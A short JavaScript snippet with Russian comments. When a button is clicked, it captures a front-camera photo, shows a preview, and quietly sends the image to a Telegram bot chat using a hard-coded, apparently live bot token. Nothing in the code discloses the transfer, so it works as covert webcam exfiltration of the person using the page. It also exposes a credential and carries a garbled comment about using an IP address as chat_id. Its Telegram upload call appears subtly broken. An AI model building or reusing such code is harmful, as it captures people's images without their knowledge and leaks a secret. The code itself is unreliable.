const takePhotoButton = document.getElementById('takePhotoButton');
const photoPreview = document.getElementById('photoPreview');
const botToken = '7931295464:AAEWFHLsS_yhnboQUJlucn5IZXWtXCPHURs'; // Замените на токен вашего бота

takePhotoButton.addEventListener('click', async () => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
    const video = document.createElement('video');
    video.srcObject = stream;
    video.style.display = 'none';
    document.body.appendChild(video);

    await video.play();

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    const dataURL = canvas.toDataURL('image/jpeg');
    photoPreview.src = dataURL;

    // Отправка фотографии в личные сообщения
    const message = {
      chat_id: -4578854804, // Используйте IP-адрес как chat_id
      photo: dataURL,
      caption: 'Фотография от вашего бота!'
    };

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(message),
    });

    if (response.ok) {
      console.log('Фотография успешно отправлена!');
    } else {
      console.error('Ошибка отправки фотографии.');
    }

    stream.getTracks().forEach(track => track.stop());
    video.remove();
  } catch (error) {
    console.error('Ошибка при получении доступа к камере:', error);
  }
});